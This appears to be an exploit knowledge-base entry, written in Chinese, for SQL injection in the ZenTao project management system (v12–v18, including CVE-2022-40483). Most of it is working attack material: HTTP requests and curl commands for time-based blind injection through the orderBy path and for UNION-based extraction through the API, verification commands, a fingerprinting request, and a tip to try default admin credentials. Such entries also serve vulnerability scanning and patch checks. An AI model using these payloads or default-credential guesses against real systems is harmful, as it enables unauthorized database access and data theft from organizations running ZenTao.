---
id: ZENTAO-SQLI
title: 禅道项目管理系统SQL注入漏洞
product: zentao
vendor: 青岛易软天创
version_affected: "v12.x - v18.x"
severity: HIGH
tags: [sqli, 国产, 需要认证]
fingerprint: ["禅道", "ZenTao", "zentao"]
---

## 漏洞描述

禅道项目管理系统多个版本存在SQL注入漏洞。

## 影响版本

- 禅道项目管理系统 v12.x - v18.x

## 前置条件

- 目标运行禅道项目管理系统且可通过网络访问
- 需要普通用户账号（可尝试默认凭据 `admin`/`123456`）

## 利用步骤

### orderBy 参数注入

```http
GET /zentao/bug-browse-1-0-all-0-id_desc-0-20-1.html HTTP/1.1
Host: target

# orderBy参数: id_desc 改为:
GET /zentao/bug-browse-1-0-all-0-id`sleep(3)`-0-20-1.html HTTP/1.1
```

### API 注入 (CVE-2022-40483)

```http
GET /zentao/api-getModel-testcase-getByList-id=1%20union%20select%201,2,3,user(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+.json HTTP/1.1
Host: target
```

## Payload

### 时间盲注（orderBy参数）

```bash
curl -s -b "zentaosid=<session_id>" "http://target/zentao/bug-browse-1-0-all-0-id\`sleep(3)\`-0-20-1.html"
```

### Union 注入（API接口）

```bash
curl -s -b "zentaosid=<session_id>" "http://target/zentao/api-getModel-testcase-getByList-id=1%20union%20select%201,2,3,user(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+.json"
```

## 验证方法

- 时间盲注：发送 `sleep(3)` payload 后响应延迟约3秒，对比无注入请求的响应时间
- Union 注入：响应 JSON 中包含数据库用户名（如 `root@localhost`）即确认漏洞存在

```bash
# 时间对比验证
time curl -s -b "zentaosid=<session_id>" "http://target/zentao/bug-browse-1-0-all-0-id\`sleep(3)\`-0-20-1.html" -o /dev/null
```

## 指纹确认

```bash
curl -s http://target/zentao/user-login.html
```
